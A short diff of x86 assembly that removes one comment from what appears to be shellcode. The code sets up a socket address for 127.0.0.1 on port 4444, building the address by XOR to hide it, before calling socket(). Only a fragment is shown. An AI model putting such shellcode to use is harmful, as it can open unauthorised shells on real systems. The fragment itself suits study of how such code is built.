@@ -16,7 +16,7 @@ section .text
     mov   eax, 0xffffffff
     xor eax, 0xfeffff80
     push eax
-    push  word 0x5c11     ; [$esp]: 4444
+    push  word 0x5c11     
     push  word 0x02       ; [$esp]: AF_INET
 
     ; call socket(domain, type, protocol)
